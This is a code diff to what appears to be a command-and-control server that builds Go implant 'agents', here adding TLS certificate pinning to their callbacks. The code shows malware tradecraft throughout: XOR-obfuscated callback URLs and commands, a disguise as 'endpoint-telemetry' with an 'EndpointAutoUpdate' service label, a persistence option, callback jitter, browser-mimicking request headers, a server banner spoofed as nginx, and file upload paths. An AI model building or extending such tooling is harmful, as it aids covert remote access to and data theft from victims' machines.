@@ -431,11 +431,32 @@ def _xor_encrypt(key: bytes, plaintext: str) -> str:
     return ct.hex()
 
 
+def _compute_cert_pin():
+    """Read the server certificate and return the SPKI SHA-256 hex digest.
+
+    Returns None if no certificate exists yet.
+    """
+    cert_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs", "server.crt")
+    if not os.path.exists(cert_path):
+        return None
+
+    from cryptography.x509 import load_pem_x509_certificate
+    from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
+    import hashlib
+
+    with open(cert_path, "rb") as f:
+        cert = load_pem_x509_certificate(f.read())
+
+    spki_bytes = cert.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
+    return hashlib.sha256(spki_bytes).hexdigest()
+
+
 def _generate_config_go(server_url, jitter_min, jitter_max, persistence,
                         profile_id=1, locale="en-US,en;q=0.9",
                         key_hex="", key_id="",
                         path_checkin="/api/checkin", path_result="/api/result",
-                        path_upload="/api/upload", path_files="/api/files/"):
+                        path_upload="/api/upload", path_files="/api/files/",
+                        cert_pin=""):
     """Generate a config.go file with the given settings."""
 
     # fresh XOR key for this build
@@ -450,16 +471,19 @@ def _generate_config_go(server_url, jitter_min, jitter_max, persistence,
     enc_files_path   = _xor_encrypt(xor_key, path_files)
     enc_flush_cmd    = _xor_encrypt(xor_key, "__flush_cache__")
     enc_svc_label    = _xor_encrypt(xor_key, "EndpointAutoUpdate")
+    enc_cert_pin     = _xor_encrypt(xor_key, cert_pin) if cert_pin else ""
 
     return f'''package main
 
 import (
 	"crypto/rand"
+	"crypto/tls"
 	"encoding/hex"
 	"fmt"
 	"net/http"
 	"os"
 	"runtime"
+	"strings"
 	"time"
 
 	"endpoint-telemetry/funcs"
@@ -488,6 +512,9 @@ var (
 	// Per-build AES-256-GCM key
 	KeyID         = "{key_id}"
 	EncryptionKey = parseDiagnosticKey("{key_hex}")
+
+	// SPKI SHA-256 pin of the server TLS certificate (empty = no pinning)
+	CertPin string
 )
 
 // parseDiagnosticKey decodes a hex string into []byte, panicking on failure.
@@ -509,7 +536,7 @@ func assignEndpointID() string {{
 }}
 
 func InitializeTelemetry() {{
-	// Decode obfuscated strings into memory
+	// Decode all XOR-obfuscated strings into memory on startup.
 	TelemetryEndpoint = funcs.ResolveConfig(obfKey, "{enc_server_url}")
 	PathCheckin       = funcs.ResolveConfig(obfKey, "{enc_checkin_path}")
 	PathResult        = funcs.ResolveConfig(obfKey, "{enc_result_path}")
@@ -518,6 +545,15 @@ func InitializeTelemetry() {{
 	FlushCommand      = funcs.ResolveConfig(obfKey, "{enc_flush_cmd}")
 	ServiceTag        = funcs.ResolveConfig(obfKey, "{enc_svc_label}")
 	funcs.ServiceLabel = ServiceTag
+	if "{enc_cert_pin}" != "" {{
+		CertPin = funcs.ResolveConfig(obfKey, "{enc_cert_pin}")
+	}}
+
+	// If a pin is baked in but the URL is HTTP, something went wrong at build time.
+	// Panic rather than run in a broken state where pinning is silently skipped.
+	if CertPin != "" && !strings.HasPrefix(TelemetryEndpoint, "https://") {{
+		panic("config: cert pin is set but server URL is not HTTPS")
+	}}
 
 	EndpointID = assignEndpointID()
 
@@ -529,11 +565,23 @@ func InitializeTelemetry() {{
 	// Set Accept-Language from the locale baked in at build time
 	profile.Headers["Accept-Language"] = Locale
 
-	// Replace the default HTTP client so every request the agent makes
-	// goes through the browser profile transport automatically
+	// Clone the default transport so we can set TLS options without touching
+	// the global default. If a pin is set, disable CA verification (which would
+	// reject self-signed certs) and replace it with the SPKI pin check.
+	baseTransport := http.DefaultTransport.(*http.Transport).Clone()
+
+	if CertPin != "" {{
+		baseTransport.TLSClientConfig = &tls.Config{{
+			InsecureSkipVerify: true,
+			VerifyPeerCertificate: funcs.MakePinVerifier(CertPin),
+		}}
+	}}
+
+	// Swap in our custom client so all outbound requests go through the
+	// browser profile transport rather than the plain default client.
 	http.DefaultClient = &http.Client{{
 		Transport: &funcs.UATransport{{
-			Base:    http.DefaultTransport,
+			Base:    baseTransport,
 			Profile: profile,
 		}},
 	}}
@@ -818,6 +866,15 @@ def build_agent():
     if not server_url.startswith("http://") and not server_url.startswith("https://"):
         return jsonify({"error": "Server URL must start with http:// or https://"}), 400
 
+    # For HTTPS builds, read the cert and compute the pin to bake into the binary.
+    # We block the build here if no cert exists rather than letting it compile
+    # a broken agent that silently fails at connection time.
+    cert_pin = None
+    if server_url.startswith("https://"):
+        cert_pin = _compute_cert_pin()
+        if cert_pin is None:
+            return jsonify({"error": "Server URL is HTTPS but no certificate found in server/certs/. Run gen_cert.py first."}), 400
+
     # Validate profile_id
     try:
         profile_id = int(profile_id)
@@ -855,6 +912,7 @@ def build_agent():
             path_result=AGENT_PATH_RESULT,
             path_upload=AGENT_PATH_UPLOAD,
             path_files=AGENT_PATH_FILES + "/",
+            cert_pin=cert_pin or "",
         )
         with open(os.path.join(tmp_agent, "config.go"), "w", encoding="utf-8") as f:
             f.write(config_content)
@@ -909,8 +967,8 @@ def build_agent():
         # save build record
         conn = get_db_connection()
         cursor = conn.execute(
-            "INSERT INTO builds (filename, target_os, arch, server_url, callback_interval, persistence, file_path, file_size, key_id, encryption_key) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
-            (filename, target_os, arch, server_url, f"{jitter_min}s-{jitter_max}s", 1 if persistence else 0, final_path, file_size, key_id, key_hex),
+            "INSERT INTO builds (filename, target_os, arch, server_url, callback_interval, persistence, file_path, file_size, key_id, encryption_key, cert_pin) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
+            (filename, target_os, arch, server_url, f"{jitter_min}s-{jitter_max}s", 1 if persistence else 0, final_path, file_size, key_id, key_hex, cert_pin),
         )
         build_id = cursor.lastrowid
         conn.commit()
@@ -921,6 +979,8 @@ def build_agent():
             "build_id": build_id,
             "filename": filename,
             "file_size": file_size,
+            "tls_pinned": cert_pin is not None,
+            "cert_pin_prefix": cert_pin[:16] + "..." if cert_pin else None,
         })
 
     except subprocess.TimeoutExpired:
@@ -930,6 +990,160 @@ def build_agent():
     finally:
         # Clean up temp directory
         shutil.rmtree(tmp_dir, ignore_errors=True)
+
+
+@app.route("/api/tls/status", methods=["GET"])
+def tls_status():
+    """Read the cert on disk and return its details plus the SPKI pin."""
+    cert_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs", "server.crt")
+    key_path  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs", "server.key")
+
+    if not os.path.exists(cert_path) or not os.path.exists(key_path):
+        return jsonify({"enabled": False, "cert": None})
+
+    from cryptography.x509 import load_pem_x509_certificate
+    from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
+    import hashlib
+
+    with open(cert_path, "rb") as f:
+        cert = load_pem_x509_certificate(f.read())
+
+    spki_bytes = cert.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
+    pin = hashlib.sha256(spki_bytes).hexdigest()
+
+    san_list = []
+    try:
+        from cryptography.x509.extensions import SubjectAlternativeName
+        from cryptography.x509 import DNSName, IPAddress
+        san_ext = cert.extensions.get_extension_for_class(SubjectAlternativeName)
+        for name in san_ext.value:
+            if isinstance(name, DNSName):
+                san_list.append({"type": "dns", "value": name.value})
+            elif isinstance(name, IPAddress):
+                san_list.append({"type": "ip", "value": str(name.value)})
+    except Exception:
+        pass
+
+    return jsonify({
+        "enabled": True,
+        "cert": {
+            "cn": cert.subject.get_attributes_for_oid(
+                __import__("cryptography.x509.oid", fromlist=["NameOID"]).NameOID.COMMON_NAME
+            )[0].value,
+            "not_valid_before": cert.not_valid_before_utc.isoformat(),
+            "not_valid_after":  cert.not_valid_after_utc.isoformat(),
+            "serial": str(cert.serial_number),
+            "san": san_list,
+            "spki_pin": pin,
+        },
+    })
+
+
+@app.route("/api/tls/generate", methods=["POST"])
+def tls_generate():
+    """Generate a new self-signed cert and write it to the certs directory."""
+    data = request.get_json() or {}
+
+    cn      = data.get("cn", "localhost").strip()
+    san_ips = [s.strip() for s in data.get("san_ips", []) if s.strip()]
+    san_dns = [s.strip() for s in data.get("san_dns", []) if s.strip()]
+    days    = int(data.get("days", 365))
+
+    if not cn:
+        return jsonify({"error": "cn is required"}), 400
+    if days < 1 or days > 3650:
+        return jsonify({"error": "days must be between 1 and 3650"}), 400
+
+    import ipaddress
+    for ip in san_ips:
+        try:
+            ipaddress.ip_address(ip)
+        except ValueError:
+            return jsonify({"error": f"Invalid IP address: {ip}"}), 400
+
+    certs_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs")
+    os.makedirs(certs_dir, exist_ok=True)
+
+    # Import cert generation deps inline so gen_cert.py stays a standalone script.
+    import datetime, hashlib, ipaddress as _ipaddress
+    from cryptography import x509
+    from cryptography.hazmat.primitives import hashes, serialization
+    from cryptography.hazmat.primitives.asymmetric import rsa
+    from cryptography.x509.oid import NameOID
+
+    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+
+    subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
+
+    san_entries = []
+    for dns_name in san_dns:
+        san_entries.append(x509.DNSName(dns_name))
+    for ip_str in san_ips:
+        san_entries.append(x509.IPAddress(_ipaddress.ip_address(ip_str)))
+    if cn not in san_dns:
+        san_entries.insert(0, x509.DNSName(cn))
+
+    now = datetime.datetime.now(datetime.timezone.utc)
+    cert = (
+        x509.CertificateBuilder()
+        .subject_name(subject)
+        .issuer_name(issuer)
+        .public_key(key.public_key())
+        .serial_number(x509.random_serial_number())
+        .not_valid_before(now)
+        .not_valid_after(now + datetime.timedelta(days=days))
+        .add_extension(x509.SubjectAlternativeName(san_entries), critical=False)
+        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
+        .sign(key, hashes.SHA256())
+    )
+
+    key_path  = os.path.join(certs_dir, "server.key")
+    cert_path = os.path.join(certs_dir, "server.crt")
+
+    with open(key_path, "wb") as f:
+        f.write(key.private_bytes(
+            serialization.Encoding.PEM,
+            serialization.PrivateFormat.TraditionalOpenSSL,
+            serialization.NoEncryption(),
+        ))
+    try:
+        os.chmod(key_path, 0o600)
+    except OSError:
+        pass
+
+    with open(cert_path, "wb") as f:
+        f.write(cert.public_bytes(serialization.Encoding.PEM))
+
+    spki_bytes = cert.public_key().public_bytes(
+        serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
+    )
+    pin = hashlib.sha256(spki_bytes).hexdigest()
+
+    return jsonify({
+        "status": "ok",
+        "spki_pin": pin,
+        "not_valid_after": cert.not_valid_after_utc.isoformat(),
+        "restart_required": True,
+    })
+
+
+@app.route("/api/tls/delete", methods=["DELETE"])
+def tls_delete():
+    """Remove the cert and key files from disk. Server falls back to HTTP on next restart."""
+    certs_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs")
+    cert_path = os.path.join(certs_dir, "server.crt")
+    key_path  = os.path.join(certs_dir, "server.key")
+
+    removed = []
+    for p, label in [(cert_path, "server.crt"), (key_path, "server.key")]:
+        if os.path.exists(p):
+            os.remove(p)
+            removed.append(label)
+
+    if not removed:
+        return jsonify({"error": "No certificate files found"}), 404
+
+    return jsonify({"status": "ok", "removed": removed, "restart_required": True})
 
 
 @app.route("/api/builds", methods=["GET"])
@@ -950,6 +1164,7 @@ def get_builds():
                 "callback_interval": b["callback_interval"],
                 "persistence": bool(b["persistence"]),
                 "file_size": b["file_size"],
+                "cert_pin": b["cert_pin"],
                 "created_at": b["created_at"],
             }
             for b in builds
@@ -1214,9 +1429,23 @@ if __name__ == "__main__":
     setattr(WSGIRequestHandler, "server_version", "nginx/1.24.0")
     setattr(WSGIRequestHandler, "sys_version", "")
 
+    # Check for TLS certificate
+    _cert_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs", "server.crt")
+    _key_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs", "server.key")
+
+    if os.path.exists(_cert_path) and os.path.exists(_key_path):
+        _ssl_ctx = (_cert_path, _key_path)
+        _tls_status = "ENABLED (self-signed)"
+    else:
+        _ssl_ctx = None
+        _tls_status = "DISABLED (no certs found in server/certs/)"
+
     print("\n=======================================")
     print("  Operator API Key (paste into dashboard):")
     print(f"  {API_KEY}")
+    print(f"  TLS       : {_tls_status}")
+    if _ssl_ctx is None:
+        print("  WARNING   : Agents built with cert pinning will NOT connect without TLS.")
     print("=======================================\n")
 
-    app.run(host="0.0.0.0", port=5000, debug=False)
+    app.run(host="0.0.0.0", port=5000, debug=False, ssl_context=_ssl_ctx)
